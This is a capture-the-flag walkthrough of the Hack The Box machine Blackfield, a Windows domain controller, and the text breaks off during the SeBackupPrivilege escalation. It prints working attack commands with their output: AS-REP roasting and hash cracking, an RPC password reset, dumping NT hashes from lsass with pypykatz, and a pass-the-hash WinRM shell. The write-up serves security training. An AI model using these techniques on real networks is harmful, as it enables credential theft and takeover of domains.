---
title: HTB: Blackfield
url: https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html
date: 2020-10-03T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-blackfield, ctf, hackthebox, nmap, dns, ldap, ldapsearch, crackmapexec, smbmap, smbclient, as-rep-roast, hashcat, bloodhound, bloodhound-python, rpc-password-reset, pypykatz, evil-winrm, sebackupprivilege, copy-filesepackupprivilege, efs, diskshadow, ntds, vss, secretsdump, smbserver, icacls, cipher, windows-sessions, metasploit, meterpreter, htb-forest, htb-multimaster, htb-re, oscp-plus-v2, oscp-like-v3, cpts-like
---

![Blackfield](https://0xdfimages.gitlab.io/img/blackfield-cover.png)

Blackfield was a beautiful Windows Activity directory box where I’ll get to exploit AS-REP-roasting, discover privileges with bloodhound from my remote host using BloodHound.py, and then reset another user’s password over RPC. With access to another share, I’ll find a bunch of process memory dumps, one of which is lsass.exe, which I’ll use to dump hashes with pypykatz. Finally with a hash that gets a WinRM shell, I’ll abuse backup privileges to read the ntds.dit file that contains all the hashes for the domain (as well as a copy of the SYSTEM reg hive). I’ll use those to dump the hashes, and get access as the administrator. In Beyond Root, I’ll look at the EFS that prevented my reading root.txt using backup privs, as well as go down a rabbit hole into Windows sessions and why the cipher command was returning weird results.

## Box Info

| Name | [Blackfield](https://hackthebox.com/machines/blackfield)  [Blackfield](https://hackthebox.com/machines/blackfield) [Play on HackTheBox](https://hackthebox.com/machines/blackfield) |
| --- | --- |
| Release Date | [06 Jun 2020](https://twitter.com/hackthebox_eu/status/1268520674752188419) |
| Retire Date | 03 Oct 2020 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Blackfield |
| Radar Graph | Radar chart for Blackfield |
| First Blood User | 00:31:13[cube0x0 cube0x0](https://app.hackthebox.com/users/9164) |
| First Blood Root | 00:59:23[cube0x0 cube0x0](https://app.hackthebox.com/users/9164) |
| Creator | [aas aas](https://app.hackthebox.com/users/6259) |

## Recon

### nmap

`nmap` found eight open TCP ports and two UDP ports:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.192
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 15:29 EDT
Nmap scan report for 10.10.10.192
Host is up (0.073s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 33.26 seconds
root@kali# nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.192
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 15:30 EDT
Nmap scan report for 10.10.10.192
Host is up (0.15s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-08 02:33:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/7%Time=5EDD4080%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-08T02:35:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.46 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.192
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 15:46 EDT
Nmap scan report for 10.10.10.192
Host is up (0.015s latency).
Not shown: 65533 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds

```

Based on that combination, it looks like a Windows Domain controller. No real hint on the OS at this point. There is a domain name from the LDAP output, blackfield.local.

### DNS - TCP/UDP 53

Any time I see DNS on TCP it’s worth trying a zone transfer. I can query for blackfield.local:

```

root@kali# dig @10.10.10.192 blackfield.local

; <<>> DiG 9.16.2-Debian <<>> @10.10.10.192 blackfield.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59954
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;blackfield.local.              IN      A

;; ANSWER SECTION:
blackfield.local.       600     IN      A       10.10.10.192

;; Query time: 36 msec
;; SERVER: 10.10.10.192#53(10.10.10.192)
;; WHEN: Sun Jun 07 20:07:29 EDT 2020
;; MSG SIZE  rcvd: 61

```

The zone transfer would list all the known subdomains, but it fails:

```

root@kali# dig axfr @10.10.10.192 blackfield.local

; <<>> DiG 9.16.2-Debian <<>> axfr @10.10.10.192 blackfield.local
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

### LDAP - TCP 389 / 3268

I’ll use `ldapsearch` to see what information I can pull. Even though I have a domain name already, I’ll ask LDAP for the base naming contexts:

```

root@kali# ldapsearch -h 10.10.10.192 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

DomainDnsZones.blackfield.local and ForestDnsZones.blackfield.local seem like interesting subdomains. Interestingly, they both resolve over `dig` as well (only one shown):

```

root@kali# dig @10.10.10.192 ForestDnsZones.BLACKFIELD.local

; <<>> DiG 9.16.2-Debian <<>> @10.10.10.192 ForestDnsZones.BLACKFIELD.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38214
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;ForestDnsZones.BLACKFIELD.local. IN    A

;; ANSWER SECTION:
ForestDnsZones.BLACKFIELD.local. 600 IN A       10.10.10.192

;; Query time: 16 msec
;; SERVER: 10.10.10.192#53(10.10.10.192)
;; WHEN: Mon Jun 08 07:15:03 EDT 2020
;; MSG SIZE  rcvd: 76

```

Unfortunately for me, I can’t get LDAP to give me any more information:

```

root@kali# ldapsearch -h 10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=BLACKFIELD,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A59, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

I tried the subdomains and got the same error. It seems I need creds at this point.

### SMB - TCP 445

#### CrackMapExec

`crackmapexec` gives a hostname, DC01, which is in line with the thinking that this was a domain controller. It also gives a domain, BLACKFIELD.local.

```

root@kali# crackmapexec smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)

```

#### Null Connection

With no creds, I can read the `profiles$` share:

```

root@kali# smbmap -H 10.10.10.192 -u null                                        
[+] Guest session       IP: 10.10.10.192:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 

```

I can connect, and there are over 300 directories in the share:

```

root@kali# smbclient -N //10.10.10.192/profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
...[snip]...

```

Each one is empty:

```

smb: \> ls ZTimofeeff
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020

\ZTimofeeff
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3322639 blocks available

```

Trying to do a recursive `get` takes a while, and returns no files:

```

smb: \> recurse on
smb: \> prompt off
smb: \> mget *
smb: \>

```

While I can’t access any files, this is an opportunity to create a list of usernames. I’ll mount the share on my local box (just hitting enter when prompted for a password):

```

root@kali# mount -t cifs //10.10.10.192/profiles$ /mnt
Password for root@//10.10.10.192/profiles$: 

```

Now I’ll use `-1` in `ls` to print only the directories one per line:

```

root@kali# mv users users.old; ls -1 /mnt/ > users

```

## Access as support

### AS-REP Roast

Just like in [Forest](/2020/03/21/htb-forest.html#as-rep-roasting), I can check this list of users for any that have the `UF_DONT_REQUIRE_PREAUTH` flag set to true. For those users, requesting a Kerberos ticket will generate a hash that I can try to break with brute force without my having any value user credentials on the domain.

I’ll use `GetNPUsers.py` to test each user, and since I know that a successful response will include a hash with `krb5asrep` in it, I’ll grep for that to see any successful results. It runs for a few minutes, but finds a result:

```

root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f252224f04becb3108d7234f0fcd94$0f355b4ad7b813039520ec6ed1f451575c79c313a3779707b24fd8824aa74d9d4fda352599ad767167ade44f4f6a67b6e0d54016e26502ab618b0d7791a40ffc60480703a1cd6bd5ae68078ab9589a91284966a54fc6134ae52f8efc41164386e4e251b41aa09f46616d53c103216d3c3e0560c5e822937ad3b4f61527c9d4fb63664abd2888d2c379340baf682a38491978c9e63d151fc54725e969df94a34f996849c439ff6953a5c9747774d6878ff5555b8c6af1415ec3c141206c460f2d4949456f429d766072d0d348b30d642e521b14cf9cef4bc8d01da69bd3995b4019ee5bbbb024346ea7786474980ec6b1bb9d13c0

```

### Crack Hash

After saving the hash to a file, I’ll send it to Hashcat for cracking. Using the basic `rockyou.txt` word list, it breaks fairly quickly:

```

root@kali# hashcat -m 18200 svc.asrep.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f252224f04becb3108d7234f0fcd94$0f355b4ad7b813039520ec6ed1f451575c79c313a3779707b24fd8824aa74d9d4fda352599ad767167ade44f4f6a67b6e0d54016e26502ab618b0d7791a40ffc60480703a1cd6bd5ae68078ab9589a91284966a54fc6134ae52f8efc41164386e4e251b41aa09f46616d53c103216d3c3e0560c5e822937ad3b4f61527c9d4fb63664abd2888d2c379340baf682a38491978c9e63d151fc54725e969df94a34f996849c439ff6953a5c9747774d6878ff5555b8c6af1415ec3c141206c460f2d4949456f429d766072d0d348b30d642e521b14cf9cef4bc8d01da69bd3995b4019ee5bbbb024346ea7786474980ec6b1bb9d13c0:#00^BlackKnight
...[snip]...

```

Creds: support / #00^BlackKnight

### Access Check

With these creds, I’ll see what kind of access I just acquired. Unsurprisingly, support does not have WinRM access:

```

root@kali# crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD\support:#00^BlackKnight "Failed to authenticate the user support with ntlm"

```

These creds do work for SMB:

```

root@kali# crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 

```

It looks like I’ve gained READ ONLY access to the `NETLOGON` and `SYSVOL` shares:

```

root@kali# smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'
[+] IP: 10.10.10.192:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share

```

These creds don’t seem to work with LDAP either:

```

root@kali# ldapsearch -h 10.10.10.192 -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090436, comment: AcceptSecurityContext error, data 52e, v4563

```

## Access as audit2020

### Enumeration Fails

#### SMB

I connected to each of the three shares:
- `profiles$` still had the same directories, all empty.
- `NETLOGON` was completely empty.
- `SYSVOL` had five files, but none of them provided anything useful to me.

#### LDAP

These creds will work to authenticate to LDAP, but I didn’t find anything interesting. I’ll do the same `query` I ran above, adding in `-D support@blackfield.local` and -`w ''#00^BlackKnight'`:

```

root@kali# ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump

```

The results were over 20-thousand lines long:

```

root@kali# wc -l support_ldap_dump 
20358 support_ldap_dump

```

I didn’t find anything particularly useful. I did get the name of the domain controller, `DC01`, which I’ll use in a minute.

```

# DC01, Domain Controllers, BLACKFIELD.local
dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: DC01

```

#### Kerberoasting

Now that I have valid domain creds, I tried to Kerberoast, but no tickets came back:

```

root@kali# GetUserSPNs.py -request -dc-ip 10.10.10.192 'blackfield.local/support:#00^BlackKnight'
Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation

No entries found!

```

### Bloodhound

#### Collection

There’s a BloodHound injestor that can be run from Linux, [BloodHound.py](https://github.com/fox-it/BloodHound.py). I had a hell of a time getting to work with Python3.8 that was running on Kali, but it worked fine when I installed with Python2, `python -m pip install bloodhound`.

The parameters for `bloodhound-python` took a bit of playing with:
- `-c ALL` - All collection methods
- `-u support -p #00^BlackKnight` - Username and password to auth as
- `-d blackfield.local` - domain name
- `-dc dc01.blackfield.local` - DC name (it won’t let you use an IP here)
- `-ns 10.10.10.192` - use 10.10.10.192 as the DNS server

```

root@kali# bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 04S

```

It produced four `.json` files:

```

root@kali# ls
computers.json  domains.json  groups.json  users.json

```

#### Analysis

I loaded all the files into Bloodhound. In the top left, I searched for support, and checked out the node info. There was one item listed under “First Degree Object Control”:

![image-20200608170323022](https://0xdfimages.gitlab.io/img/image-20200608170323022.png)

When I click the “1”, I can see that support has “ForceChangePassword” on AUDIT2020:

![image-20200608170401907](https://0xdfimages.gitlab.io/img/image-20200608170401907.png)

### Password Reset over RPC

There’s a somewhat famous post by Mubix about [resetting Windows passwords over RPC](https://room362.com/post/2017/reset-ad-user-password-with-linux/). I’ll use the command `setuserinfo2`:

```

rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER

```

The blog says to use 23 as the level.

If I reset with something that doesn’t match the password policy, it complains:

```

rpcclient $> setuserinfo2 audit2020 23 '0xdf'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION

```

If it succeeds, silence in return:

```

rpcclient $> setuserinfo2 audit2020 23 '0xdf!!!'

```

In case I want to just do this from the command line, it can be run as:

```

root@kali# rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'

```

### Check Creds

On changing the creds, I can now authenticate as audit2020:

```

root@kali# crackmapexec smb 10.10.10.192 -u audit2020 -p '0xdf!!!'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:0xdf!!! 

```

Still no WinRM:

```

root@kali# crackmapexec winrm 10.10.10.192 -u audit2020 -p '0xdf!!!'
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD\audit2020:0xdf!!! "Failed to authenticate the user audit2020 with ntlm"

```

## Shell as svc\_backup

### Enumeration

As audit2020, I now have access to a new share that wasn’t even listed before, `forensic`:

```

root@kali# smbmap -H 10.10.10.192 -u audit2020 -p '0xdf!!!'
[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share

```

Connecting to `forensic`, there are three folders:

```

root@kali# smbclient -U audit2020 //10.10.10.192/forensic '0xdf!!!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020  

```

This appears to be the results of an investigation. `commands_output` has a bunch of text files:

```

smb: \> ls commands_output\
  .                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                7846143 blocks of size 4096. 3490514 blocks available

```

There’s an extra account, Ipwn3dYourCompany, in `domain_admins.txt`:

```

Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany     
The command completed successfully.

```

`tools` is three publicly available toolsets:

```

smb: \> ls tools\
  .                                   D        0  Sun Feb 23 08:39:08 2020
  ..                                  D        0  Sun Feb 23 08:39:08 2020
  sleuthkit-4.8.0-win32               D        0  Sun Feb 23 08:39:03 2020
  sysinternals                        D        0  Sun Feb 23 08:35:25 2020
  volatility                          D        0  Sun Feb 23 08:35:39 2020

                7846143 blocks of size 4096. 3490514 blocks available

```

This makes a good case for not just `mget *` from the root of the share, as there’s a large volume here of stuff I don’t need to copy.

`memory_analysis` is the most interesting:

```

smb: \> ls memory_analysis\
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                7846143 blocks of size 4096. 3490514 blocks available

```

It’s a series of Zip archives, and inside each is a memory dump file.

### Extract Hashes

Immediately I’m drawn to `lsass.zip`. [Mimikatz](https://github.com/gentilkiwi/mimikatz) first came to promenance because it would dump plaintext credentials and hashes from `lsass.exe` As anti-virus started catching on to that, attackers pivoted. A [well known technique](https://attack.mitre.org/techniques/T1003/) is to use `procdump.exe` from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) (and signed by Microsoft) to dump `lsass.exe` and then exfil that memory dump and extract hashes from it in the attacker controlled space.

I’ll unzip `lsass.zip` and it gives a 137MB Mini Dump, which is the memory from the process at the time of capture:

```

root@kali# unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP               
root@kali# file lsass.DMP 
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
root@kali# ls -lh lsass.DMP 
-rwxrwx--- 1 root vboxsf 137M Feb 23 11:02 lsass.DMP

```

I could move this over to a Windows VM, but there’s a Mimikatz alternative, [pypykatz](https://github.com/skelsec/pypykatz) which will work just fine. I’ll install it with `pip3 install pypykatz`. [This blog](https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows) has a good section on dumping with `pypykatz` from Linux. It dumps a bunch of information:

```

root@kali# pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP                          
FILE: ======== lsass.DMP =======                          
== LogonSession ==
authentication_id 406458 (633ba)                    
session_id 2
username svc_backup                        
domainname BLACKFIELD                               
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413  
luid 406458
        == MSV ==                          
                Username: svc_backup                      
                Domain: BLACKFIELD   
                LM: NA                              
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None                             
        == SSP [633ba]==             
                username                   
                domainname
                password None
        == Kerberos ==
                Username: svc_backup                      
                Domain: BLACKFIELD.LOCAL   
                Password: None                            
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None
                                                          
== LogonSession ==                                  
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server                                        
logon_time 2020-02-23T17:59:38.218491+00:00                                                                                                                                                                                                
sid S-1-5-96-0-2
...[snip]...

```

There are 23 different logon sessions in the data (only the first 1.5 shown above). The first one has the most useful bit of information, the NT hash for svc\_backup.

### Shell over WinRM

#### crackmapexec

The hash definitely works for SMB:

```

root@kali# crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d  

```

When I checked for WinRM, `Pwn3d!` as well:

```

root@kali# crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
WINRM       10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```

#### Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) provides a shell:

```

root@kali# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> 

```

From here, I can grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\svc_backup\desktop> cat user.txt
0b81b5d1************************

```

## Priv: svc\_backup –> administrator

### Enumeration

If the account name didn’t give it away, checking `whoami /priv` shows that this account has a really powerful privilege:

```
*Evil-WinRM* PS C:\Users\svc_backup\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

`SeBackUpPrivilege` basically allows for full system read. I showed this two weeks ago in [Multimaster](/2020/09/19/htb-multimaster.html#read-as-system). This is because svc\_backup is in the Backup Operators group:

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/9/2020 5:27:18 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

[Backup Operators](https://www.backup4all.com/what-are-backup-operators-kb.html) is a default Windows group that is designed to backup and restore files on the computer using certain methods to read and write all (or most) files on the system.

### Copy-FileSeBackupPrivilege

[This repo](https://github.com/giuliano108/SeBackupPrivilege) has a nice set of PowerShell tools for abusing the `SeBackupPrivilege`. I’ll clone it, and then I’ll need to upload two files to Blackfields:

```
*Evil-WinRM* PS C:\programdata> upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
Info: Uploading /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll to C:\programdata\SeBackupPrivilegeCmdLets.dll

Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
Info: Uploading /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll to C:\programdata\SeBackupPrivilegeUtils.dll

Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

```

Now I’ll import them into my current session:

```
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll

```

